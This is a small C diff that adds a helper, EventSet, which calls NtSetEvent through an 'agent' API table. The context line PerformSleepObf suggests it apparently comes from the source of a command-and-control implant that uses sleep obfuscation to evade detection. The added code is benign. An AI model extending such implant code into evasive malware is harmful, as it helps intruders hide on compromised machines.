@@ -111,3 +111,10 @@ void PerformSleepObf()
 	WaitForSingleObject(NtCurrentProcess(), TimeToSleep, FALSE);
 #endif
 }
+
+BOOL EventSet(_In_ HANDLE Event)
+{
+	NTSTATUS status = 0;
+	status = agent->apis->pNtSetEvent(Event, NULL);
+	return (status >= 0) ? TRUE : FALSE;
+}
